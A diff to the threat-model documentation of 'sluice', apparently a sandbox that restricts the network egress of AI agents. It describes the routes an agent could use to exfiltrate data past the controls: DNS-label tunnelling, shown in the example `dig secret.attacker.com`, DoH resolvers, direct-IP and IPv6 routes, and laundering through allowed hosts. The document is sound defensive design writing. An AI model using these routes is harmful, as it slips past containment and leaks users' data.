@@ -71,12 +71,15 @@ The guarantees below hold only while these do:
   allowed by **Host / TLS-SNI** (spliced, never decrypted), so the decision is by *domain*
   and survives IP rotation. Only the base hosts + `SLUICE_ALLOW_DOMAINS` are reachable; the
   boot self-test fails closed if a denied host or a direct-IP connection is reachable.
-- **IP-literal / DoH / IPv6 bypasses** -> a direct-IP HTTPS connection has no SNI ->
-  terminated; plain DNS is restricted to the configured resolver; IPv6 is disabled entirely (we
-  proxy v4 only, so a dual-stack app can't slip out over v6). Known **DoH/DoT resolver endpoints**
-  (`core/doh-endpoints.txt`) are denied *even if allowlisted* - otherwise an agent could tunnel
-  exfil as DNS-over-HTTPS to an allowed resolver and bypass the SNI filter; `SLUICE_ALLOW_DOH=1`
-  opts back in.
+- **IP-literal / DNS / IPv6 bypasses** -> a direct-IP HTTPS connection has no SNI ->
+  terminated; IPv6 is disabled entirely (we proxy v4 only, so a dual-stack app can't slip out over
+  v6). **DNS resolution is scoped to the egress allowlist**: dnsmasq forwards only allowlisted names,
+  and the firewall lets only it (not app code) reach a resolver - so an agent can't tunnel exfil as
+  DNS labels to an off-allowlist authoritative nameserver (`dig secret.attacker.com`): the query has
+  no upstream and is refused, and rebinding answers into RFC1918 are dropped. Known **DoH/DoT resolver
+  endpoints** (`core/doh-endpoints.txt`) are denied *even if allowlisted* - otherwise an agent could
+  tunnel exfil as DNS-over-HTTPS to an allowed resolver and bypass the SNI filter. `SLUICE_ALLOW_DOH=1`
+  re-allows a DoH resolver; `SLUICE_DNS_OPEN=1` restores forward-all resolution (both weaken this).
 - **Reading/altering the rest of your machine** -> only the project dir (and its git
   common dir, for worktrees) is mounted. Nothing else is visible.
 - **Host privilege escalation** -> sessions run non-root (uid 1000) with **no effective
@@ -126,11 +129,12 @@ The guarantees below hold only while these do:
    guarantees. Hostile multi-tenant isolation remains a non-goal.
 2. **Exfil through an *allowed* host.** The allowlist is **host-granular**. If you allow
    a shared host - `raw.githubusercontent.com`, a cloud storage endpoint, an LLM API -
-   data can be laundered through it. Keep the list minimal; never allow a host an
-   attacker can also write to.
-3. **Exfil through `SLUICE_ALLOW_IPS`.** Reviewed fixed IPs get *direct* egress on any port
-   (the escape hatch for non-HTTP services like a database) - bypassing the proxy, so
-   unfiltered by hostname. Keep the list minimal and specific.
+   data can be laundered through it. Keep the list minimal; never allow a host an attacker can also
+   write to. `sluice` flags such a host at session start (`SLUICE_LAUNDERING_OK=1` acknowledges and
+   silences it, `SLUICE_STRICT_LAUNDERING=1` refuses to run).
+3. **Exfil through `SLUICE_ALLOW_IPS`.** Reviewed fixed IPs get *direct* egress (the escape hatch for
+   non-HTTP services like a database) - bypassing the proxy, so unfiltered by hostname. Scope each
+   entry to one port with `ip:port` (a bare ip/cidr opens *every* port); keep the list minimal and specific.
 4. **A squid vulnerability or a loose allowlist.** The egress policy now rests on squid +
    the allowlist file. A squid CVE or an over-broad `SLUICE_ALLOW_DOMAINS` is the trust anchor
    to guard - including the `.domain` wildcards `sluice learn` can write (a leading-dot entry
@@ -179,13 +183,17 @@ data hidden in an *allowed* path is still opaque.
 
 ## Residual risk, one line
 
-Egress is **hostname-filtered** (squid splice) with IPv6 off and direct-IP blocked, so the
-IP-rotation / direct-IP / DoH / v6 gaps are closed. The remaining sharp edge is
-**allowed-host laundering**: because we splice (never decrypt), data hidden in a request to
-an *allowed* host isn't inspected. Keep `SLUICE_ALLOW_DOMAINS`/`SLUICE_ALLOW_IPS` minimal and
-never allow a host an attacker can also write to.
+Egress is **hostname-filtered** (squid splice) with IPv6 off, direct-IP blocked, and **DNS scoped to
+the allowlist**, so the IP-rotation / direct-IP / DoH / DNS-label / v6 gaps are closed. The remaining
+sharp edge is **allowed-host laundering**: because we splice (never decrypt), data hidden in a request
+to an *allowed* host isn't inspected. Keep `SLUICE_ALLOW_DOMAINS`/`SLUICE_ALLOW_IPS` minimal (the
+latter port-scoped) and never allow a host an attacker can also write to - `sluice` flags such a host
+at run, a per-run **egress receipt** (hosts reached + bytes, in the state dir) makes after-the-fact
+audit possible, and `SLUICE_EGRESS_MAX_BYTES` can gate CI on volume.
 
 ---
 
-_Last reviewed 2026-06-03 against sluice 0.8.0 (released) + the post-release seccomp hardening on main
-(default-superset / browser / audit). Revisit when the egress path, mount model, or runtime options change._
+_Last reviewed 2026-06-05 against sluice 0.8.0 (released) + the post-release hardening on main: seccomp
+(default-superset / browser / audit) and the egress work (allowlist-scoped DNS, port-scoped
+`SLUICE_ALLOW_IPS`, laundering-host gate, durable egress receipt + `SLUICE_EGRESS_MAX_BYTES`). Revisit
+when the egress path, mount model, or runtime options change._
